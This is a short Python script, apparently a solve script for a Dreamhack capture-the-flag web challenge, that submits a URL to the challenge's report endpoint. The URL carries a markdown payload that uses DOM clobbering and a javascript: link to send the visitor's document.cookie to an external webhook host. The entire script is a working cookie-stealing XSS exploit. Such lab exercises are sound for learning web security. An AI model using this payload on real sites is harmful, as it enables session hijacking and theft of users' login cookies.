import requests
from urllib.parse import quote

url = "http://host3.dreamhack.games:8344"

webhook = 'https://xlscrht.request.dreamhack.games'

payload = '''
[a](' id='CONFIG)
[b](' id='CONFIG' name='debug)
[c](javascript:location.href=`%s/${document.cookie}`' id='CONFIG' name='main)
''' % webhook

res = requests.post(f'{url}/Report.php', data={
    'path': f'/GuestBook.php/a/?content={quote(payload)}'
})

print("> Submitted payload")